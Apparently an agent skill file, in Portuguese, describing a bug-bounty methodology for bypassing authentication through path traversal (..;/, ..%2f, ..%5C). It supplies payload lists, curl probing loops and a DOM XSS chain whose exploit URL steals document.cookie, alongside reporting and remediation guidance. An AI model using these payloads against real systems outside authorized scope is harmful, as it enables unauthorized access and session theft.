---
name: auth-bypass-path-traversal
description: Metodologia de BYPASS DE AUTENTICAÇÃO por path traversal — acessar arquivos e páginas que EXISTEM na aplicação real e que deveriam exigir login, saindo de um diretório público e subindo para a área autenticada. NÃO é a skill de descoberta de aplicação interna atrás de proxy (essa é path-normalization-traversal); aqui o alvo é a AUTORIZAÇÃO: recursos legítimos e conhecidos da aplicação, protegidos por um filtro que decide pelo PREFIXO do caminho. Use SEMPRE que o alvo separar recursos em espaços tipo /public/ e /html/, /static/ e /app/, /assets/ e /internal/, ou quando houver login e existirem páginas que só aparecem depois dele. As técnicas centrais são TRÊS segmentos, todos testados sempre: ..;/ (ponto ponto ponto-e-vírgula, interpretado como "sobe um nível" em várias configurações de Apache e stacks Java), ..%2f (barra codificada) e ..%5C (barra invertida codificada) — nenhum deles aciona as regras de WAF e firewall que bloqueiam o ../ clássico. ATENÇÃO À MONTAGEM: %2f e %5C JÁ CONTÊM a barra, então o caminho interno é colado direto neles sem barra extra (/cliente/..%2fadmin/portal/index.html e NÃO /cliente/..%2f/admin/...). Cenário típico e muito comum: estando em /cliente/ (público), acessar /admin/portal/index.html (que exige login) via /cliente/..%2fadmin/portal/index.html — a página autenticada carrega normalmente porque o filtro viu /cliente/ no começo do path — o filtro de autorização enxerga /public/ no começo do path e libera, enquanto o servidor navega para outro lugar; é bypass de middleware. Cobre: identificação dos dois espaços de recurso, a matriz de segmentos a testar, enumeração dos arquivos alcançados (análise de JS e fuzzing de nomes), e o ENCADEAMENTO com DOM XSS — arquivo interno alcançado por traversal contendo sink client-side (location.hash para iframe.src aceitando javascript:) que fornece a primitiva de execução, chain em que nenhuma das duas partes vale sozinha. Só usar dentro do escopo formalmente autorizado.
---

# Bypass de Autenticação por Path Traversal

Metodologia para alcançar **recursos autenticados que existem na aplicação
real** — páginas internas, telas de menu, arquivos de área logada — partindo de
um diretório público, sem nunca fazer login.

**Esta skill não é sobre descobrir aplicação interna atrás de proxy** (isso é a
`path-normalization-traversal`, que trata de discrepância de normalização entre
proxy e backend). Aqui o alvo é a **autorização**: o recurso é conhecido,
legítimo e faz parte do produto — ele só deveria exigir sessão.

**Pré-condição obrigatória**: só use dentro do escopo formalmente autorizado.
Somente leitura — confirmar o acesso, nunca extrair dados de usuários nem
alterar estado.

## 1. A ideia central — o filtro decide pelo prefixo

Aplicações Java e stacks sobre Apache frequentemente delegam o controle de
acesso a um **filtro/middleware que olha o PREFIXO do caminho**:

```
   se o path começa com /public/   ->  libera, é conteúdo aberto
   se o path começa com /html/     ->  exige sessão autenticada
```

O ataque não quebra o filtro — **concorda com ele**. O path começa com
`/public/`, então o filtro libera. Mas o servidor, ao resolver o caminho,
navega para outro lugar:

```
   FILTRO   vê:      /app/public/..;/html/menu/paginaInterna.html
                     começa com /public/  ->  LIBERADO
                            |
                            v
   SERVIDOR resolve:  /app/html/menu/paginaInterna.html
                     entrega o arquivo interno, sem autenticação
```

É **bypass de middleware**: as duas camadas concordam sobre o texto do path e
discordam sobre o que ele significa.

## 2. Os três segmentos

O `../` clássico todo mundo conhece — inclusive firewalls e WAFs, que o
bloqueiam na maior parte das vezes. **O que muita gente não testa é `..;`**
(ponto, ponto, ponto e vírgula).

Em certas configurações do Apache e em stacks Java, esse segmento é
interpretado como "sobe um nível de diretório", **igual ao `../`**, mas sem
acionar as regras de bloqueio convencionais — porque a regra procura `../` ou
`%2e%2e`, e `..;` não casa com nenhuma das duas.

Na prática:

```http
# Requisição normal
GET /app/public/logo.png
→ serve o arquivo público normalmente

# Requisição com traversal
GET /app/public/..;/html/menu/paginaInterna.html
→ o Apache resolve para /app/html/menu/paginaInterna.html  (sem autenticação)
```

O ponto e vírgula é o separador de *path parameter* do Java (`;jsessionid=...`).
Algumas camadas o descartam ao normalizar, outras não — e é dessa discordância
que nasce o bug.

**`..;/` não é o único.** Os outros dois que resolvem a maioria dos casos:

- **`..%2f`** — a barra codificada. O filtro compara a string crua e não vê uma
  travessia; o servidor decodifica e vê `../`.
- **`..%5C`** — a barra invertida codificada. Funciona contra filtros escritos
  com regex que só conhecem `/` e esquecem `\`, e contra backends que tratam
  `\` como separador.

Teste os três sempre — qual funciona depende de qual camada decodifica primeiro,
e não dá para prever.

## 3. Passo 1 — Identificar os dois espaços

Antes de qualquer payload, mapeie **de onde** você pode sair e **para onde**
quer chegar.

**Espaço público (a origem do traversal)** — qualquer coisa que responda sem
sessão:

```
/public/    /static/    /assets/    /resources/    /files/
/img/       /css/       /js/        /docs/         /media/
```

**Espaço autenticado (o destino)** — descubra fazendo login **na sua própria
conta** e anotando os caminhos:

```
/html/      /app/       /internal/   /admin/      /portal/
/secure/    /private/   /user/       /menu/
```

```bash
# 1) o que responde sem sessao?
for P in public static assets resources files img docs; do
  echo "[$(curl -s -o /dev/null -w '%{http_code}' https://alvo.com/app/$P/)] /app/$P/"
done

# 2) logue na SUA conta e colete os paths internos que a aplicacao usa
#    (DevTools > Network, ou a skill bughunter sobre os bundles)
```

Você precisa de **um arquivo público que exista** (ex.: `logo.png`) como âncora
— é o baseline que prova que o prefixo funciona.

## 4. Passo 2 — Os três segmentos e a matriz

São **três** segmentos que resolvem a maioria dos casos:

```
..;/        ponto ponto ponto-e-vírgula  (Apache / stacks Java)
..%2f       barra codificada             (%2f = "/")
..%5C       barra invertida codificada   (%5c = "\")
```

### 4.1 Regra de montagem — atenção à barra

**`..%2f` e `..%5C` já CONTÊM a barra.** Codificados, viram `../` e `..\` — então
o caminho interno é colado **direto neles, sem barra extra**:

```
CERTO:   /cliente/..%2fadmin/portal/index.html      -> decodifica p/ /cliente/../admin/...
ERRADO:  /cliente/..%2f/admin/portal/index.html     -> vira /cliente/..//admin/...
```

Já o `..;/` traz a barra literal no fim, então também não leva outra:

```
CERTO:   /cliente/..;/admin/portal/index.html
```

### 4.2 Exemplo completo

Cenário típico: você está em `/cliente/` (público) e quer
`/admin/portal/index.html` (exige autenticação).

```
                                       ↓ o segmento entra aqui
https://alvo.com/cliente/..%2fadmin/portal/index.html
                 └──────┘            └───────────────┘
                 público             alvo autenticado
```

As três formas, uma travessia:

```
https://alvo.com/cliente/..;/admin/portal/index.html
https://alvo.com/cliente/..%2fadmin/portal/index.html
https://alvo.com/cliente/..%5Cadmin/portal/index.html
```

Duas travessias (quando o público está um nível mais fundo):

```
https://alvo.com/cliente/..;/..;/admin/portal/index.html
https://alvo.com/cliente/..%2f..%2fadmin/portal/index.html
https://alvo.com/cliente/..%5C..%5Cadmin/portal/index.html
```

Sem barra antes do segmento (colado no último segmento do prefixo):

```
https://alvo.com/cliente..;/admin/portal/index.html
https://alvo.com/cliente..%2fadmin/portal/index.html
https://alvo.com/cliente..%5Cadmin/portal/index.html
```

**Isso acontece muito** — é o cenário mais comum desta skill. Página que exige
login carregando normalmente porque o filtro viu `/cliente/` no começo do path.

### 4.3 Variantes extras, só se as três falharem

```
/cliente/../admin/portal/index.html          <- o clássico, quase sempre bloqueado
/cliente/..%252fadmin/portal/index.html      <- encoding duplo
/cliente/..%3b/admin/portal/index.html       <- ";" codificado
/cliente/.;/admin/portal/index.html
/cliente/%2e%2e%2fadmin/portal/index.html
```

### 4.4 Script

Sempre com `curl --path-as-is` — sem a flag o curl normaliza no cliente e você
testa outra coisa:

```bash
PUB="cliente"
ALVO="admin/portal/index.html"

# segmentos que JA contem a barra -> colados direto no alvo
for SEG in "..%2f" "..%5C" "..%2f..%2f" "..%5C..%5C" "..%252f"; do
  for FORMA in "/${PUB}/${SEG}${ALVO}" "/${PUB}${SEG}${ALVO}"; do
    C=$(curl -sk --path-as-is -o /tmp/t.html -w '%{http_code}|%{size_download}' \
        "https://alvo.com${FORMA}")
    echo "[$C] $FORMA"
  done
done

# segmentos com barra literal no fim
for SEG in "..;/" "..;/..;/" ".;/"; do
  for FORMA in "/${PUB}/${SEG}${ALVO}" "/${PUB}${SEG}${ALVO}"; do
    C=$(curl -sk --path-as-is -o /tmp/t.html -w '%{http_code}|%{size_download}' \
        "https://alvo.com${FORMA}")
    echo "[$C] $FORMA"
  done
done
```

### 4.5 Como saber que funcionou

Compare com **três** baselines, não um:

| Requisição | O que espera |
|---|---|
| `/app/public/logo.png` | 200 — o prefixo público funciona |
| `/app/html/menu/paginaInterna.html` (direto, sem sessão) | 302/401/403 — é protegido mesmo |
| `/app/public/..;/html/menu/paginaInterna.html` | **200 com o HTML interno = achado** |

O segundo baseline é indispensável: se o arquivo já responde direto sem sessão,
não há bypass — o recurso simplesmente não estava protegido, e isso é outro
achado (menor).

## 5. Passo 3 — Enumerar o que dá para alcançar

Confirmado o traversal, o trabalho vira descobrir **quais** arquivos internos
existem. Duas fontes, nesta ordem:

**1) Análise de JavaScript** — é a fonte mais rica e a que gera menos ruído.
Rode a skill `bughunter` sobre os bundles e extraia caminhos:

```bash
grep -ohE '["'\''][a-zA-Z0-9_/.-]+\.(html|jsp|jsf|do|action|js)["'\'']' bundles/*.js \
  | tr -d '"'\''' | sort -u
grep -ohE '/(html|app|internal|menu|portal)/[A-Za-z0-9_/.-]+' bundles/*.js | sort -u
```

**2) Fuzzing de nomes** — só depois de esgotar o JS, e mirado: nomes de menu,
telas de wizard, páginas de erro e sucesso. É trabalhoso; no caso real levou
horas entre análise de JS e `ffuf`.

**Priorize por valor:** telas de configuração, menus administrativos, páginas de
wizard, arquivos com nome sugerindo fluxo interno. E leia **o conteúdo** de cada
arquivo alcançado — links, nomes de endpoint e lógica client-side viram os
próximos alvos.

## 6. Passo 4 — Encadear com DOM XSS

**Este é o ponto que multiplica o impacto**, e é o que transforma dois achados
médios em uma chain.

Um arquivo interno alcançado por traversal frequentemente tem lógica
client-side escrita assumindo contexto autenticado e confiável — logo, sem
validação. Caso real:

```js
// Lê o parâmetro da hash da URL
const wizardUrl = location.hash.replace('#wizardUrl=', '');

// Atribui direto ao src do iframe (sem nenhuma validação)
document.getElementById('wizardFrame').src = wizardUrl;
```

O código foi feito para receber uma URL **interna** via hash e carregá-la num
iframe. Mas não valida nada: nem o esquema, nem a origem, nem o formato.

Passando `javascript:` como valor, o navegador executa o código **no contexto de
origem da página**, não do iframe — ou seja, acesso total a cookies, DOM e
sessão da aplicação.

**URL de exploração completa:**

```
https://<host>/app/public/..;/html/menu/paginaInterna.html#wizardUrl=javascript:alert(document.cookie)
```

Abre no navegador, **sem login**, e os cookies da aplicação aparecem no alert.

### 6.1 Como a chain funciona

```
1. Atacante manda o link para a vítima (ou acessa direto)
        ↓
2. Browser faz GET /app/public/..;/html/menu/paginaInterna.html
        ↓
3. Apache aplica traversal → entrega /app/html/menu/paginaInterna.html (sem auth)
        ↓
4. Página carrega e lê location.hash
        ↓
5. iframe.src = "javascript:alert(document.cookie)"
        ↓
6. JavaScript executa no contexto da aplicação
```

**A chave:** o traversal entrega acesso a um arquivo que só deveria existir em
contexto autenticado. O DOM XSS nesse arquivo fornece a primitiva de execução.
**Sem o traversal, o XSS seria inacessível. Sem o XSS, o traversal seria
inofensivo.**

Por isso: ao alcançar qualquer arquivo interno, **sempre faça code review dele**
— use a skill `dom-xss`, procurando sources (`location.hash`, `location.search`)
que cheguem a sinks de navegação (`iframe.src`, `location.href`, `a.href`), que
aceitam `javascript:`.

## 7. Fluxo de execução

```
1. Mapear espaço público e espaço autenticado          (seção 3)
2. Âncora: confirmar um arquivo público que existe
3. Baseline: confirmar que o alvo interno é protegido  (4.1)
4. Os TRES segmentos: ..;/  ..%2f  ..%5C                (seção 4)
   |__ atencao: %2f e %5C JA contem a barra, nao leva outra
   |__ 1 e 2 travessias, com e sem barra antes do segmento
5. Confirmado? enumerar arquivos internos              (seção 5)
6. Code review de cada arquivo alcançado               (seção 6)
7. Sink client-side sem validação? -> chain            (6.1)
```

## 8. Reportar

1. Mostre os **três** baselines na ordem: público 200, interno direto
   302/401/403, traversal 200 com o conteúdo. A diferença entre o segundo e o
   terceiro **é** a prova.
2. Explique a causa raiz: filtro de autorização decide pelo prefixo do path, e
   `..;` faz o filtro ver `/public/` enquanto o servidor navega para `/html/`.
3. Liste os arquivos internos alcançados — mostra alcance, não só um caso.
4. Se houver chain com DOM XSS, apresente a URL completa e o trecho de código
   vulnerável, deixando claro que **nenhuma das duas partes vale sozinha**.
5. Não inclua dados de usuários; use a sua própria sessão para demonstrar o
   `document.cookie`.
6. Remediação: normalizar o path **antes** da decisão de autorização, autorizar
   por recurso e não por prefixo, e validar o esquema da URL antes de atribuir a
   `iframe.src` (permitir só `http:` e `https:`).

## 9. Checklist

- [ ] Espaço público e espaço autenticado mapeados.
- [ ] Âncora pública confirmada (arquivo que existe e responde 200).
- [ ] Baseline do alvo interno confirmado como protegido (302/401/403 direto).
- [ ] Os TRÊS segmentos testados: `..;/`, `..%2f`, `..%5C`.
- [ ] `..%2f` e `..%5C` colados direto no alvo, SEM barra extra depois.
- [ ] Uma e duas travessias testadas.
- [ ] Formas com e sem barra antes do segmento testadas.
- [ ] `curl --path-as-is` usado em todas as requisições.
- [ ] Resultado comparado com os três baselines, não só com um.
- [ ] Arquivos internos enumerados por análise de JS antes de qualquer fuzzing.
- [ ] Cada arquivo alcançado passou por code review (`dom-xss`).
- [ ] Sinks de navegação testados com `javascript:` no arquivo interno.
- [ ] Somente leitura — nenhum dado de usuário acessado, nenhum estado alterado.
